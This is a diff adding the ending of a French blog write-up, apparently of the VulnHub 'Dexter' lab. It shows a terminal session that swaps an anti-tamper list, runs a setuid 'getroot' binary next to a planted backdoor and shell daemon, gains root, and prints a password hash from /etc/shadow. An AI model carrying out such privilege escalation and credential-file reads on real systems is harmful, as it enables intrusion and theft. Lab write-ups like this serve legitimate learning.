@@ -511,5 +511,30 @@ Un dièse est placé pour marquer un commentaire bash et une quote est là pour 
 
 Et miracle :  
 
+```plain
+$ cp antitamper.list /tmp/sav_antitamper.list
+$ cp /tmp/modified_antitamper.list antitamper.list
+$  ls -l Panel/exes/
+total 740
+-rw-rw-rw- 1 mysql mysql     36 Jun  9 18:12 bd.php
+-rwsr-xr-x 1 root  root   10722 Jun 10 01:15 getroot
+-rwxrw-rw- 1 mysql mysql 738792 Apr 19 13:44 tshd
+$ ./Panel/exes/getroot
+root@dexter:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@dexter:/tmp# head -1 /etc/shadow
+root:$6$gN9t1RCt$dYj80MPAWCeWkh9kTpoPHuUU.x5hfaXfrB.UUWkMQDQpjDfAHO4D2RLWvG00wjUGrO8EMdfl/Ys31WePgl8hV1:16145:0:99999:7:::
+```
+
+![FUCK YEAH!](https://raw.githubusercontent.com/devl00p/blog/master/images/dexter3.gif)
+
+Quand à l'explication sur le lancement de *antitamper.py* :  
+
+```plain
+root@dexter:~# tail -1 /var/spool/cron/crontabs/root 
+*/1 * * * * python /var/www/antitamper.py
+```
+
+Next step [LoBOTomy](http://vulnhub.com/entry/bot-challenges-lobotomy,89/) ?
 
 *Published June 13 2014 at 22:09*
